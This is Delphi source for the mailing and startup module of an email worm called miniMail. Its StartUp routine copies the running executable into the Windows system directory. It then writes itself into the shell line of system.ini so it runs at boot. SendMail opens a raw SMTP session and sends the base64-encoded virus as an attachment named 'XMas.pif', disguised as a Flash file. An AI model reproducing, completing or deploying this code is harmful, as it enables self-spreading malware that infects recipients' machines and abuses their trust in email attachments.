unit MiniMailFunc;

interface

Uses
  Windows,
  Winsock;

Var
  MutexHandle: THandle;
  VirusHandle: String;
  VirusHandleEnc: String;
  ScrLink: String;
  mailSock:TSocket;

procedure StartUp;
PROCEDURE Base64Encode(CONST InBuffer;InSize:Cardinal;VAR OutBuffer); REGISTER; OVERLOAD;
PROCEDURE Base64Encode(CONST InText:AnsiString;VAR OutText:AnsiString); OVERLOAD;

Function SendMail(Body, Subject, From, Recipt, ContentType, Boundray, SMTP: String; Port: Integer):Bool;
function ExtractFilePath(const Path: string): string;
function ExtractFileName(const Path: string): string;
function GetFileSize(FileName: String): Int64;
function ExtractFileExt(const Filename: string): string;
function LowerCase(const S: string): string;
function IPstr(HostName:String) : String;

implementation

function IPstr(HostName:String) : String;
LABEL Abort;
TYPE
  TAPInAddr = ARRAY[0..100] OF PInAddr;
  PAPInAddr =^TAPInAddr;
VAR
  WSAData    : TWSAData;
  HostEntPtr : PHostEnt;
  pptr       : PAPInAddr;
  I          : Integer;
BEGIN
  Result:='';
  WSAStartUp($101,WSAData);
  TRY
    HostEntPtr:=GetHostByName(PChar(HostName));
    IF HostEntPtr=NIL THEN GOTO Abort;
    pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
    I:=0;
    WHILE pptr^[I]<>NIL DO BEGIN
      IF HostName='' THEN BEGIN
        IF(Pos('168',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
          Result:=inet_ntoa(pptr^[I]^);
          GOTO Abort;
        END;
      END ELSE
      RESULT:=(inet_ntoa(pptr^[I]^));
      Inc(I);
    END;
    Abort:
  EXCEPT
  END;
  WSACleanUp();
END;


FUNCTION MyRecv(Code:STRING) : Boolean;
VAR
  Buf : ARRAY [0..2048] OF Char;
BEGIN
  ZeroMemory(@Buf[0],SizeOf(Buf));
  IF(Recv(mailSock,Buf,SizeOf(Buf),0)=SOCKET_ERROR)OR(Copy(Buf,1,3)<>Code) THEN Result:=False ELSE Result:=True;
END;

FUNCTION MySend(STR:STRING) : Boolean;
BEGIN
  IF Send(mailSock,STR[1],Length(STR),0)=SOCKET_ERROR THEN Result:=True ELSE Result:=False;
END;

Function SendMail(Body, Subject, From, Recipt, ContentType, Boundray, SMTP: String; Port: Integer):Bool;
Var
  F     :FILE;
  P     :AnsiString;
  FileBuf:AnsiString;

  WSA   :TWSAData;
  addr  :TSockAddrIn;

  LocalHost  : ARRAY [0..63] OF CHAR;

  Procedure SendData(Text: String; Var Sock: TSocket);
  Begin
    Send(Sock, Text[1], Length(Text), 0);
  End;

Begin
  WSAStartUp(MakeWord(2,1), WSA);
  GetHostName(LocalHost,SizeOf(LocalHost));

  MailSock := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(Port);
  Addr.sin_addr.S_addr := inet_addr(pchar(ipstr(SMTP)));

  Result := False;
  If Connect(MailSock, Addr, SizeOf(Addr)) = ERROR_SUCCESS Then
  Begin
      IF NOT MyRecv('220') THEN Exit;
      MySend('HELO '+LocalHost+#13#10);
      IF NOT MyRecv('250') THEN Exit;
      MySend('MAIL FROM: <'+From+'>'#13#10);
      IF NOT MyRecv('250') THEN Exit;
      MySend('RCPT TO: <'+Recipt+'>'#13#10);
      IF NOT MyRecv('250') THEN Exit;
      MySend('DATA'#13#10);
      IF NOT MyRecv('354') THEN Exit;
      MySend('From: '+From+#13#10+
             'To: '+Recipt+#13#10+
             'Subject: '+Subject+#13#10+
             'MIME-Version: 1.0'#13#10+
             'Content-Type: multipart/mixed; boundary="'+boundray+'"'#13#10#13#10+
             '--'+boundray+#13#10+
             'Content-Type: text/plain; charset:us-ascii'#13#10#13#10+
             Body+#13#10#13#10+
             '--'+boundray+#13#10+
             'Content-Type: application/x-shockwave-flash;'#13#10+
             '    name="XMas.pif"'#13#10+
             'Content-Transfer-Encoding: base64'#13#10#13#10);
      AssignFile(F, VirusHandleEnc);
      FileMode:=0;
      {$I-}
      Reset(F,1);
      IF IOResult=0 THEN BEGIN
        SetLength(FileBuf,FileSize(F));
        BlockRead(F,FileBuf[1],FileSize(F));
        Base64Encode(FileBuf,P);
        MySend(P);
        CloseFile(F);
      END;
      {$I+}
      MySend(#13#10'--'+boundray+'--'#13#10'.'#13#10);
      IF NOT MyRecv('250') THEN Exit;
      MySend('QUIT'#13#10);
      Result:=True;
      WSACleanup();
      Exit;
  End;
End;

function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

function ExtractFileExt(const Filename: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Filename);
  for i := L downto 1 do
  begin
    Ch := Filename[i];
    if (Ch = '.') then
    begin
      Result := Copy(Filename, i + 1, L - i);
      Break;
    end;
  end;
end;

function GetFileSize(FileName: String): Int64;
Var
  H: THandle;
  fData: tWin32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), fData);
  If H <> INVALID_HANDLE_VALUE Then
  Begin
    Windows.FindClose(H);
    Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
  End;
End;

PROCEDURE Base64Encode(CONST InBuffer;InSize:Cardinal;VAR OutBuffer); REGISTER;
CONST
  cBase64Codec : ARRAY [0..63] OF AnsiChar = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
VAR
  ByThrees : Cardinal;
  LeftOver : Cardinal;
  Line     : Word;
ASM
  mov ESI,[EAX]
  mov EDI,[ECX]
  mov EAX,EBX
  mov ECX,$03
  xor EDX,EDX
  div ECX
  mov ByThrees,EAX
  mov LeftOver,EDX
  lea ECX,cBase64Codec[0]
  xor EAX,EAX
  xor EBX,EBX
  xor EDX,EDX
  cmp ByThrees,0
  jz  @@LeftOver
  mov Line,0
  @@LoopStart:
  inc Line
  LODSW
  mov BL,AL
  shr BL,2
  mov DL,BYTE PTR [ECX+EBX]
  mov BH,AH
  and BH,$0F
  rol AX,4
  and AX,$3F
  mov DH,BYTE PTR [ECX+EAX]
  mov AX,DX
  STOSW
  LODSB
  mov BL,AL
  shr BX,6
  mov DL,BYTE PTR [ECX+EBX]
  and AL,$3F
  xor AH,AH
  mov DH,BYTE PTR [ECX+EAX]
  mov AX,DX
  STOSW
  cmp Line,19
  jnz @@ugor
  mov AX,$0A0D
  STOSW
  mov Line,0
  @@ugor:
  dec ByThrees
  jnz @@LoopStart
  @@LeftOver:
  cmp LeftOver, 0
  jz  @@Done
  xor EAX,EAX
  xor EBX,EBX
  xor EDX,EDX
  LODSB
  shl AX,6
  mov BL,AH
  mov DL,BYTE PTR [ECX+EBX]
  dec LeftOver
  jz  @@SaveOne
  shl AX,2
  and AH,$03
  LODSB
  shl AX,4
  mov BL,AH
  mov DH,BYTE PTR [ECX+EBX]
  shl EDX,16
  shr AL,2
  mov BL,AL
  mov DL,BYTE PTR [ECX+EBX]
  mov DH,'='
  jmp @@WriteLast4
  @@SaveOne:
  shr AL,2
  mov BL,AL
  mov DH,BYTE PTR [ECX+EBX]
  shl EDX,16
  mov DH,'='
  mov DL,'='
  @@WriteLast4:
  mov EAX,EDX
  ror EAX,16
  STOSD
  @@Done:
END;

PROCEDURE Base64Encode(CONST InText:AnsiString;VAR OutText:AnsiString); OVERLOAD;
VAR
  PIn     : Pointer;
  POut    : Pointer;
  InSize  : Cardinal;
  OutSize : Cardinal;
BEGIN
  InSize:=Length(InText);
  OutSize:=(InSize DIV 3) SHL 2;
  IF InSize MOD 3>0 THEN Inc(OutSize,4);
  Outsize:=Outsize+Outsize DIV 20;
  SetLength(OutText,OutSize);
  PIn:=@InText[1];
  POut:=@OutText[1];
  Base64Encode(PIn,InSize,POut);
END;

function ExtractFileName(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, i + 1, L - i);
      Break;
    end;
  end;
end;

function ExtractFilePath(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, 1, i);
      Break;
    end;
  end;
end;

procedure StartUp;
var
  Mutex: String;
  fName: String;
  bCopy: Bool;

  Handle: THandle;
  sysDir: Array[0..255] Of Char;
begin

  Mutex := 'miniMail-version1.0';
  Handle := CreateMutex(NIL, FALSE, pChar(Mutex));
  If Handle = ERROR_ALREADY_EXISTS Then
    ExitProcess(0);
  MutexHandle := Handle;

  GetSystemDirectory(sysDir, 256);
  fName := String(sysDir)+'\miniMail.exe';
  bCopy := CopyFile(pChar(ParamStr(0)), pChar(fName), False);
  If (Not bCopy) Then
    ExitProcess(0);
  WritePrivateProfileString('boot', 'shell', 'Explorer.exe miniMail.exe', 'system.ini');

  VirusHandle := fName;

  fname := ExtractFilePath(paramstr(0));
  Delete(fName, Length(fName), 1);

  While Length(fName) > 30 do
  Begin
    fname := ExtractFilePath(fName);
    Delete(fName, Length(fName), 1);
  End;

end;

end.
 